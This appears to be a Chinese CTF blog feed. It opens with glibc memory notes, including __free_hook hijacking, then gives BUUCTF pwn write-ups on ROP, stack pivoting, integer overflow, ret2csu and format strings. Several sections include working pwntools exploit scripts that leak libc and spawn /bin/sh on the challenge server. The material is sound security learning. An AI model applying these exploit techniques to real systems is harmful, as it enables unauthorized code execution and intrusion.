<p>offset：被映射对象内容的起点。</p>
<p>成功执行时，mmap()返回被映射区的指针，munmap()返回0。失败时，mmap()返回MAP_FAILED[其值为(void *)-1]，munmap返回-1。</p>
<p>注：（（void*）-1） ：一个某类型指针类型，指向地址为0xffffffff，无效地址，表明错误</p>
<p>映射建立之后，即使文件关闭，映射依然存在。因为映射的是磁盘的地址，不是文件本身，和文件句柄无关。同时可用于进程间通信的有效地址空间不完全受限于被映射文件的大小，因为是按页映射。</p>
<p>2、<strong>munmap</strong></p>
<p>函数原型为<em><em>int munmap(void</em> start,size_t length)</em>* 用来取消参数start所指的映射内存起始地址，参数length则是欲取消的内存大小。当进程结束或利用exec相关函数来执行其他程序时，映射内存会自动解除，但关闭对应的文件描述符时不会解除映射。</p>
<p>addr是调用mmap()时返回的地址，len是映射区的大小；当映射关系解除后，对原来映射地址的访问将导致段错误发生。 </p>
<p>3、<strong>msync</strong></p>
<p>函数原型为**int msync( void *addr, size_t len, int flags )**，一般说来，进程在映射空间的对共享内容的改变并不直接写回到磁盘文件中，往往在调用munmap（）后才执行该操作。</p>
<p>可以通过调用msync()实现磁盘上文件内容与共享内存区的内容一致。</p>
<p>4、<strong>malloc</strong></p>
<p>函数原型为**void *malloc(unsigned int size)**；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</p>
<p>分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当动态内存不再使用时，应使用free()函数将内存块释放。</p>
<ul>
<li>当 size=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 size 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<p>5、<strong>free</strong></p>
<p>函数原型为**void free(void *ptr) **是C语言中释放内存空间的函数，通常与申请内存空间的函数malloc()结合使用，可以释放由 malloc()、calloc()、realloc() 等函数申请的内存空间。</p>
<p>ptr– 指针指向一个要释放内存的内存块，该内存块之前是通过调用 malloc、calloc 或 realloc 进行分配内存的。如果传递的参数是一个空指针，则不会执行任何动作。free函数不返回任何值</p>
<p>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code></p>
<p>6、**__free_hook**</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">void</span> __libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*hook) (<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = <span class="hljs-built_in">atomic_forced_read</span> (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, <span class="hljs-built_in">RETURN_ADDRESS</span> (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>上面的代码对是 free() 函数的一部分，可以看出程序先把全局变量 __free_hook 赋给了局部变量 hook ，然后对 hook 是否为 NULL 进行判断，如果不为空，则执行 hook ，第一个参数就是 chunk 的内容部分。</p>
<p>一般的情况下 __free_hook 是为 NULL 的，所以是不会执行的，但是如果有人恶意修改 __free_hook 的话，就会造成 __free_hook 劫持</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu03</title>
    <url>/2021/04/07/2021-04-07-buu03/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="十、铁人三项-第五赛区-2018-rop"><a href="#十、铁人三项-第五赛区-2018-rop" class="headerlink" title="十、铁人三项(第五赛区)_2018_rop"></a>十、铁人三项(第五赛区)_2018_rop</h3><p>checksec一下，开启了nx保护，然后拖入ida</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407213546.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407213807.png"></p>
<p>呃。。。应该就是比较熟悉的rop的构建了，直接上exp吧，这类题目做挺多的了：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220012.png"></p>
<h3 id="十一、gyctf-2020-borrowstack"><a href="#十一、gyctf-2020-borrowstack" class="headerlink" title="十一、gyctf_2020_borrowstack"></a>十一、gyctf_2020_borrowstack</h3><p>先做下这题，一直想完整的了解栈迁移，借着这题真正的掌握栈迁移的手法和知识点吧，先checksec一下，再拖入ida分析</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220304.png"></p>
<p>里面很简单，没有什么复杂的函数，很适合借此了解栈迁移！首先read函数读取的字节数不够，只能够刚好覆盖返回地址。第二输入点的位置是bss段上，不是栈。所以这时候就是要把栈迁移到这里，因为在这里我们可以有足够的输入构建系统函数调用shell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220423.png"></p>
<p>这题太坑了！！！！！！！！！！！！！首先，你如果使用了system函数调用/bin/sh，这时候无论你选择哪个版本的libc都无法成功获取shell！网上的师傅们好像也是这样，原因都只是模糊的说猜测是因为栈迁移的位置太靠近一些重要数据，可能还是影响到了什么东西。都采取了one_gadget的办法，这里我同样踩坑！</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090610.png"></p>
<p>师傅们都是泄露出puts的got表地址，去查询出libc版本然后下载，然而我很惊奇的发现，我泄露的地址查询不到对应的libc版本。。。所以这里的exceve函数地址我是直接把师傅们的搬运过来了0x4526a</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090158.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090211.png"></p>
<p>以及，栈迁移的发送函数，只能选择send。（别问为什么，我选择的是sendline。。。一直出问题，甚至为了找问题，我每个与师傅们wp不同地方慢慢改，发现竟然是这个原因，只能怪自己粗心吧，猜测是这里的read读取过于严格，所有输入数据都是刚好，多输入了一个\n导致了问题的发生，下次一定注意！）还有就是距离重要数据太近这点，前面的ret执行多次就是为了避免这个，因为bss段距离.got.plt太近了，并且跳转回main函数的时候，还会进行一次巨大的升栈，所以的话执行多次ret把栈的位置往bss段的高地址处迁移</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408091459.png"></p>
<p>其他的话，wp如下：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408092959.png"></p>
<h3 id="十二、bjdctf-2020-babyrop"><a href="#十二、bjdctf-2020-babyrop" class="headerlink" title="十二、bjdctf_2020_babyrop"></a>十二、bjdctf_2020_babyrop</h3><p>例行checksec一下，然后运行一下。开启了nx和部分relro缓解机制。运行的结果也不能看出些什么，进入ida看看吧</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408155229.png"></p>
<p>在一个函数里面有着很明显的溢出点，足够我们覆盖返回地址并且构造系统函数了。一道常规的rop，就不多说了，已经做烂了。。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408155615.png"></p>
<p>exp如下：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408170004.png"></p>
<h3 id="十三、others-shellcode"><a href="#十三、others-shellcode" class="headerlink" title="十三、others_shellcode"></a>十三、others_shellcode</h3><p>例行checksec以及执行附件，开启了nx，pie以及部分relro。运行附件发现直接就获取了shell。。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073535.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073615.png"></p>
<p>然后我试着nc一下远程，看看是不是也能获取shell，没想到。。确实可以</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073831.png"></p>
<p>查看ida，发现附件中是已经调用了execve函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410074925.png"></p>
<h3 id="十四、pwn2-sctf-2016"><a href="#十四、pwn2-sctf-2016" class="headerlink" title="十四、pwn2_sctf_2016"></a>十四、pwn2_sctf_2016</h3><p>例行checksec并且运行，只开启nx和部分的relro，拖入ida查看一下代码</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418202516.png"></p>
<p>程序比较简单，可以很明确的发现，不存在后门函数，也没有明显的溢出点，被限制了。printf也没有问题，对于这样的情况，我第一时间是想到了整数溢出，通过整数溢出来越过检查，通过小数变成大数，从而溢出。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418202734.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418205625.png"></p>
<p>接下来讲下漏洞点：main函数里面定义的v2是int类型的，而在get_n里面却是unsigned的，这里如果我们输入了一个负数，那么在get_n里面将变得非常大，足够我们溢出了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418210123.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418210150.png"></p>
<p>但是没有后门函数，所以只能进行rop了，用printf函数泄露got表地址，LibcSearcher一下，最终构造sys函数获取shell。网上师傅们都取了格式化参数，其实没必要的，本身printf存在着格式化字符串漏洞，所以可以直接printf出来，没必要再输入一个格式化参数。这里有个坑的地方，好吧，是我傻得踩到了还一直没看出来。get_n里面的getchar里面已经对0截断了，所以在第二次构造payload的时候，不可以像往常那样顺手写个p32(0)，后面感觉不对劲，我给他顺手改成了个p32(1)。。。。有点傻。。这个后面三个字节仍然是0，依旧截断了。写出来警示一下大伙，多注意点细节。</p>
<p>对了，libc找出来有15个，你可以知道我有多绝望了，一个个试了，竟然都不行，而且还是两遍！！！</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25066</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br>p.recvline() <span class="hljs-comment">#接收最后的printf，让程序流执行完</span><br>printf_addr=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf address:&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf_addr)<br>libc_base=printf_addr-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(system)+<span class="hljs-string">&#x27;beef&#x27;</span>+p32(binsh) <span class="hljs-comment">#beef！！！！！</span><br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十五、ciscn-2019-s-3"><a href="#十五、ciscn-2019-s-3" class="headerlink" title="十五、ciscn_2019_s_3"></a>十五、ciscn_2019_s_3</h3><p>常规执行checksec一下，查看保护，并且执行一下程序，看看回显</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210425202117.png"></p>
<p>出现了一堆乱码，可能是地址泄露了？进入ida看看情况如何</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123130.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123138.png"></p>
<p>main函数里面很简单，两个系统调用就没了，而有系统调用，那就去看看汇编代码。汇编代码前两行要注意，这里的rsp没有减少，在这题里面rsp=rbp了，后面计算偏移不可以把rbp覆盖了。左边的函数栏看一下，有个gadget的，进入查看</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123625.png"></p>
<p>很显然，这里面给出了两个调用号，0F和3BH，对应着这题两种解法，我们先介绍使用3BH调用号调用execve函数的解法，稍后再介绍另一种。</p>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>execve(“/bin/sh”,0,0)总共有三个参数，所以我们需要控制rdi,rsi,rdx三个寄存器的值，很显然，这是return to libc_csu_init。rsi和rdx的值很好控制，设置为0即可，而/bin/sh字符串则需要我们去寻找了，我们只有一个输入点，就是往栈上面输入/bin/sh，然后通过泄露栈的地址而得到该地址，从而把地址给rdi，最后再调用syscall函数，即可获取shell。</p>
<p>而write函数会输出栈上0x30个内存单元内容，通过调试，可以知道0x20位置处会泄露出一个栈上的地址，我们只需要计算该地址到/bin/sh的偏差，就可以获取/bin/sh的地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429124551.png"></p>
<p>上图是我在本地调试的情况，0x7ffcaba65838是泄露出来的地址，可是扣去0x7ffcaba656f0得到的却是0x148，而我去网上找师傅们的wp是0x138，不太懂为什么。所以我只能本地获取到了shell，但是远程不能过了。</p>
<p>获取到了/bin/sh的地址，后面就是构造rop链了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429124941.png"></p>
<p>这边csu里面的edi是有问题的，因为/bin/sh的地址是不止4个字节，所以edi是不够盛放的，所以我们需要rdi才行，这边使用了ROPgadget去寻找。所以后面payload构造rop时，这边还需要利用r12盛放栈上的内容进行跳转到栈上继续执行，而不能直接就在r12里面存放syscall地址进行直接调用。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,25007)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="hljs-number">0x40059a</span><br>rdx_edi_rsi=<span class="hljs-number">0x400580</span><br>offset=<span class="hljs-number">0x138</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(main)<br>p.send(payload)<br>p.recv(<span class="hljs-number">0x20</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br>binsh=leak-offset<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(leak)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(binsh)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *main&#x27;</span>)<br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span><br>payload+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(binsh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rdx_edi_rsi)+p64(execve)  <span class="hljs-comment">#p64(execve)在栈上距离/bin/sh有0x50的长度</span><br>payload+=p64(pop_rdi)+p64(binsh)+p64(syscall)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>后面有缘再更新吧，，，，</p>
<h3 id="十六、ciscn-2019-es-2"><a href="#十六、ciscn-2019-es-2" class="headerlink" title="十六、ciscn_2019_es_2"></a>十六、ciscn_2019_es_2</h3><p>常规checksec查看保护措施</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501105608.png"></p>
<p>程序只开启了NX，应该是道较为简单的题目，进入ida看看情况</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501105715.png"></p>
<p>这里总共输入了两次数据，同时还能printf出来，可能会泄露一些重要地址信息。这里的read函数全部被限制到只够刚好覆盖到返回地址就不能再继续填充了，所以这里是用了栈迁移的思想，把栈迁移到栈上，制造一个假栈。</p>
<p>栈迁移利用leave 和ret指令改变ebp和esp的指向位置，所以要先得到要迁移的地址，也就是s位置，这边泄露ebp的值，从而计算两者偏差</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501110624.png"></p>
<p>最顶上0xfffcd65就是s的位置，而0xffcd678就是ebp指向的位置，而在该地址处的内容为0xfffcd688就是我们泄露出来的内容，与s偏差为0x38</p>
<p>而系统函数附件中已经有了system的调用，差的就只有/bin/sh的字符串了，我们可以直接写在栈上，然后仍然是用泄露出来的地址算出/bin/sh地址，作为参数即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27262</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>p.recvline()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+<span class="hljs-string">&#x27;dead&#x27;</span>+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu02</title>
    <url>/2021/04/05/2021-04-05-buu02/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="四、ciscn-2019-n-8"><a href="#四、ciscn-2019-n-8" class="headerlink" title="四、ciscn_2019_n_8"></a>四、ciscn_2019_n_8</h3><p>checksec一下<img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405201012.png">发现保护基本都开了，有点害怕，赶紧进入ida一探究竟：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405202606.png"></p>
<p>好吧，是我想多了，达成条件很简单，就是让var[13]的值等于17就可以获取shell，这里要注意一点，var是int类型数组，所以填充的时候，比如var[0]就要填进去4个字节的内容才能填满（这里我刚开始疏忽了，一直没能获取权限。。）所以要是用a去填充要先填52个才行，之后才是输入17，不过如果直接使用p32会更方便一些，exp如下：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405205400.png"></p>
<h3 id="五、not-the-same-3dsctf-2016"><a href="#五、not-the-same-3dsctf-2016" class="headerlink" title="五、not_the_same_3dsctf_2016"></a>五、not_the_same_3dsctf_2016</h3><p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405205812.png"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405205847.png"></p>
<p>查看一下开启了nx保护，以及一部分的relro，然后运行了一下，好像什么都没有。。拖入ida看看</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405210102.png"></p>
<p>好家伙，main函数里面的东西，以及函数窗口里面的情况让我想起了<strong>get_started_3dsctf_2016</strong>这题，似乎很像的样子<img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405210308.png"></p>
<p>同样的不用覆盖ebp，直接就能到返回地址了，不清楚原理。。暂且不管吧，以后可能会看到的</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405211241.png"></p>
<p>这里有个函数，已经将flag的值读取并输入到了fl4g的位置，所以我们先用这个函数填充到返回地址处，把flag先读取到fl14为起始地址的内存中，接下来试着把这里的内容泄露出来，即可获取flag。所以我们需要write函数，并且因为write函数有三个参数，所以还需要pop 三个寄存器的指令进行清理栈，最后的p32(0)是pop中含着的ret操作，所以还需要再加一个返回地址，因为我们已经输出了flag，所以返回地址并不需要在意是哪，随便都可。具体exp如下：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405212259.png"></p>
<h3 id="六、-HarekazeCTF2019-baby-rop"><a href="#六、-HarekazeCTF2019-baby-rop" class="headerlink" title="六、[HarekazeCTF2019]baby_rop"></a>六、[HarekazeCTF2019]baby_rop</h3><p>只开启了nx和部分的relro保护机制，并且运行了没有多少的内容，很正常的内容回显。应该不会难的，嗯，先这么想。</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405212721.png"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405212741.png"></p>
<p>进入ida看看，是不是跟想象的一样简单</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405213207.png"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405213218.png"></p>
<p>的确如此，没有乱起名字。。确实是简单的rop，system函数和/bin/sh字符全都在，并且还有scanf的无限制输入，exp如下：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405214535.png"></p>
<p>小插曲，我进入的时候，很惊讶的发现没有flag。。。不知道是管理员忘了，还是说哪个人做了不小心可能删了吧。。</p>
<h3 id="七、jarvisoj-level2-x64"><a href="#七、jarvisoj-level2-x64" class="headerlink" title="七、jarvisoj_level2_x64"></a>七、jarvisoj_level2_x64</h3><p>只开启了nx，运行一下，貌似也很简单的样子，预测可能跟32位的level2差不多吧，就是变到了64位的环境下，可能为了考验传参</p>
<p><img src="/2021/04/05/2021-04-05-buu02/image-20210405220229158.png"><span class="image-caption">image-20210405220229158</span></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405220316.png"></p>
<p>做法跟上一题差不多吧，就不多放图片了，直接exp了：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405221357.png"></p>
<h3 id="八、ciscn-2019-n-5"><a href="#八、ciscn-2019-n-5" class="headerlink" title="八、ciscn_2019_n_5"></a>八、ciscn_2019_n_5</h3><p>好家伙，nx都没开启，可能要直接在栈上执行shellcode了</p>
<p><img src="/2021/04/05/2021-04-05-buu02/image-20210407194309117.png"><span class="image-caption">image-20210407194309117</span></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407194556.png"></p>
<p>确实的，有个gets无限输入，很明显可以被利用的溢出点。不过后面带了个name有点奇怪，进入看看汇编是什么情况</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407194714.png"></p>
<p>好吧，应该是ida出错了一些，只有调用了text，那就直接进行覆盖吧。因为pwntools已经有着自带的shellcode注入了，（要是没有的话我也不会写了，哈哈哈）exp如下：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407201139.png"></p>
<p>这里一开始是想直接就在栈上注入shellcode的，不过没能成功，可能是因为太长覆盖了一些其他信息了吧，所以就转移到bss上执行，在gdb中也能查看到bss也具有可执行性</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407201152.png"></p>
<h3 id="九、ciscn-2019-ne-5"><a href="#九、ciscn-2019-ne-5" class="headerlink" title="九、ciscn_2019_ne_5"></a>九、ciscn_2019_ne_5</h3><p>开启了nx和部分的relro缓解措施</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407201501.png"></p>
<p>进入ida按F5会反编译失败，只要进入到对应地址的scanf函数里面按F5对函数编译，再回到main函数即可反编译成功</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407204835.png"></p>
<p>首先把第一个密码绕过，输入administrator即可，当我们进入下面额print函数查看可以发现有system函数的调用，此时我们只需要再查找到参数和溢出点即可，往上看，调用了fflush函数，里面有sh字符串。这里有个点，sh字符串也可以成为system的函数获取到shell的权限。那么只剩下溢出点了。前面的scanf函数输入，都无法溢出。只有在Addlog里面的scanf函数可以覆盖，然后再去到函数4GetFlag里面</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407204813.png"></p>
<p>有个strcpy函数，可以把之前输入的src复制到dest中，造成溢出。exp如下：</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407213005.png"></p>
<p>exp还有个要注意的就是system后跟的返回地址不能写p32(0)这样的，因为这么写，scanf函数遇到’\x00’会停止读取，所以我这里选择直接写四个字符串</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu01</title>
    <url>/2021/04/04/2021-04-04-buu01/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="一、-第五空间2019-决赛-PWN5"><a href="#一、-第五空间2019-决赛-PWN5" class="headerlink" title="一、[第五空间2019 决赛]PWN5"></a>一、[第五空间2019 决赛]PWN5</h3><p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104030.png"></p>
<p>checksec一下，32位文件，开启了nx与canary保护措施</p>
<p>拖入ida静态分析</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104056.png"></p>
<p>在main函数就可以很清晰的发现，有个判断语句成立就可以获取shell，然后分析该如何使if判断成立，可以发现，要相等的是一个随机数，对于随机数一般都是覆盖成我们已知的一个数值，接着看，存在了printf(&amp;buf)字符串漏洞，很显然已经可以利用了，计算下字符串的偏移</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104049.png"></p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104053.png"></p>
<p>两种方式皆可算出偏移为10，构造%10$n，直接输入地址即可，因为在32位下，输入的就是4字节的数，刚好覆盖了随机数exp如下：</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404105030.png"></p>
